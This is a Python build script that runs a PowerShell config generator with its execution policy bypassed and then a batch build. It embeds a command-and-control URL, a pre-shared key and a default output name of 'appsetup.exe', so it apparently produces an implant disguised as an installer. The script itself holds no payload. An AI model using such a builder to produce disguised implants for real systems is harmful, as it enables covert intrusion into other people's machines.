#!/usr/bin/env python3
"""build driver: runs genconfig.ps1 directly (bypasses cmd quoting issues),
then invokes build.bat with SH_NOGEN=1 so the bat skips its own genconfig.

usage: python tools/do_build.py [--c2 URL] [--psk-file server/psk.txt]
                                [--name app.exe] [--pin ...] [--auth ...]
"""
import argparse
import os
import subprocess
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--c2", default="http://127.0.0.1:8443/gate")
    ap.add_argument("--psk-file", default=os.path.join(ROOT, "server", "psk.txt"))
    ap.add_argument("--name", default="appsetup.exe")
    ap.add_argument("--pin", default="")
    ap.add_argument("--auth", default="")
    ap.add_argument("--release-only", action="store_true")
    args = ap.parse_args()

    psk = open(args.psk_file).read().strip()

    r = subprocess.run(
        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
         "-File", os.path.join(ROOT, "tools", "genconfig.ps1"),
         "-Psk", psk, "-C2", args.c2, "-Pin", args.pin,
         "-Auth", args.auth, "-OutDir", ROOT],
        capture_output=True, text=True)
    out = (r.stdout + r.stderr).strip()
    print(out if out else "genconfig: (no output)")
    if "PSK_FP=" not in out:
        print("[driver] genconfig failed", file=sys.stderr)
        return 1
    print("[driver] psk fingerprint:", out.split("PSK_FP=")[-1].splitlines()[0][:16])

    env = dict(os.environ)
    env["SH_NOGEN"] = "1"
    bat = ["build.bat", "-psk", psk, "-c2", args.c2, "-name", args.name]
    if args.pin:
        bat += ["-pin", args.pin]
    if args.auth:
        bat += ["-auth", args.auth]
    if args.release_only:
        bat += ["-release-only"]
    r2 = subprocess.run(["cmd", "/c"] + bat, cwd=ROOT,
                        capture_output=True, text=True, env=env)
    print(r2.stdout[-1500:])
    if r2.stderr.strip():
        print(r2.stderr[-500:], file=sys.stderr)
    return r2.returncode


if __name__ == "__main__":
    sys.exit(main())
